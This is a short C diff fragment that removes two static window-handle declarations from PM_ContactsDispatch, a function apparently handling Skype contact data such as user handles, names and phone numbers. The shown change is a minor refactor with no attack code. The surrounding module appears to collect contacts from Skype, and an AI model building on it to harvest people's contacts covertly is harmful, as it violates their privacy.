@@ -103,8 +103,6 @@ void SendRequestContacts(HWND skype_api_wnd, HWND skype_pm_wnd)
 
 DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
 {
-	static HWND skype_api_wnd = NULL;
-	static HWND skype_pm_wnd = NULL;
 	WCHAR user_handle[256];
 	WCHAR user_name[256];
 	WCHAR phone_hom[64];
